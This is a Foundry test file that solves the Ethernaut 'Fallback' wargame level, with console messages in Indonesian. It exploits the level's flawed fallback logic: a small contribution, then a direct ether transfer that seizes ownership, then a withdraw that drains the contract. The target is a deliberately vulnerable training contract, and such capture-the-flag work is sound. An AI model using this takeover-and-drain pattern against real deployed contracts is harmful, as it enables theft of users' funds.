// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

interface IEthernaut {
    function createLevelInstance(address _level) external payable; 
    function submitLevelInstance(address _instance) external; 
}

contract EthernautTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);

    function testLevel1_Fallback() public {
                vm.deal(address(this), 1 ether);
        address levelFactoryAddress = 0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB;

        vm.recordLogs();
        ethernaut.createLevelInstance(levelFactoryAddress);

        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        console.log("Target Level Address:", levelAddr);

        Fallback level = Fallback(payable(levelAddr));


        console.log("Step 1: Masuk Buku Tamu...");
        level.contribute{value: 0.0001 ether}();

        console.log("Step 2: Mengambil alih Owner...");
        (bool success,) = address(level).call{value: 0.0001 ether}("");
        require(success, "Transfer gagal");
        
        assertEq(level.owner(), address(this));

        console.log("Step 3: Kuras saldo!");
        level.withdraw();


        console.log("Melapor ke Ethernaut...");
        ethernaut.submitLevelInstance(payable(levelAddr));
        console.log("SELESAI. Cek status PASS di bawah.");
    }
    
    receive() external payable {}
}